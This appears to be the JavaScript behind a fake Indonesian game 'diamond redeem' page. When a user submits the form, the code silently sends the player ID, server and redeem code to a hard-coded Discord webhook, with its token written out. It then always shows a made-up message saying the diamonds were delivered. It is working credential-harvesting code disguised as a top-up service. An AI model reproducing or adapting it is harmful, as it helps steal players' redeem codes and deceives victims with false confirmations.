const form = document.getElementById('redeem-form');
const playerIdInput = document.getElementById('player-id');
const serverSelect = document.getElementById('server');
const codeInput = document.getElementById('redeem-code');
const amountSelect = document.getElementById('amount');
const submitBtn = document.getElementById('submit-btn');
const btnText = submitBtn.querySelector('.btn-text');
const spinner = submitBtn.querySelector('.spinner');
const resultBox = document.getElementById('result');

function showResult(message, type) {
    resultBox.textContent = message;
    resultBox.className = 'result ' + type;
    resultBox.hidden = false;
}

function hideResult() {
    resultBox.hidden = true;
}

function setLoading(isLoading) {
    submitBtn.disabled = isLoading;
    btnText.hidden = isLoading;
    spinner.hidden = !isLoading;
}

form.addEventListener('submit', function (e) {
    e.preventDefault();
    hideResult();

    const playerId = playerIdInput.value.trim();
    const server = serverSelect.value;
    const code = codeInput.value.trim();
    const amount = amountSelect.value;

    if (!/^\d{8,12}$/.test(playerId)) {
        showResult('ID Player harus 8–12 digit angka.', 'error');
        return;
    }

    if (!server) {
        showResult('Pilih server terlebih dahulu.', 'error');
        return;
    }

    if (code.length < 4) {
        showResult('Kode redeem minimal 4 karakter.', 'error');
        return;
    }

    if (!amount) {
        showResult('Pilih jumlah diamond.', 'error');
        return;
    }

    setLoading(true);

    const WEBHOOK_URL = "https://discord.com/api/webhooks/1556669543370326117/rnuLR8PtLUZEwdPOzBH9cH0PwwOMLd145-dnMgx5R_fu_uxE80652lO06g7eWEHS6bje";

    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            embeds: [{
                title: "💎 Permintaan Diamond Baru!",
                color: 0x2ecc71,
                fields: [
                    { name: "ID Player", value: playerId, inline: true },
                    { name: "Server", value: server.toUpperCase(), inline: true },
                    { name: "Kode Redeem", value: code, inline: true },
                    { name: "Jumlah Diamond", value: amount, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        })
    }).catch(err => console.log("Kirim Discord gagal:", err));
    setTimeout(function () {
        setLoading(false);
        const diamond = amount;
        showResult(
            'Berhasil! ' + diamond + ' diamond dikirim ke ID ' + playerId + ' (' + server.toUpperCase() + ').',
            'success'
        );
        form.reset();
    }, 2000);
});
